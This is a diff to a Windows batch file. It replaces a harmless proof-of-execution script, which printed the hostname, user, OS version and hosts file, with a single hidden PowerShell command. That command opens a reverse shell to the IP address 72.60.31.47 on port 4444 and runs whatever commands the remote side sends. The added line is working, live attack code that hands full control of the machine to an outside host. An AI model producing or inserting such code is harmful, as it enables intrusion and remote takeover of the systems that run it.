@@ -1,9 +1,4 @@
 @echo off
-echo CODE_EXEC_PROOF_WINDOWS_BEGIN
-hostname
-whoami
-ver
-type %SystemRoot%\System32\drivers\etc\hosts
-echo CODE_EXEC_PROOF_WINDOWS_END
+cmd /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('72.60.31.47',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 exit /b 0
 
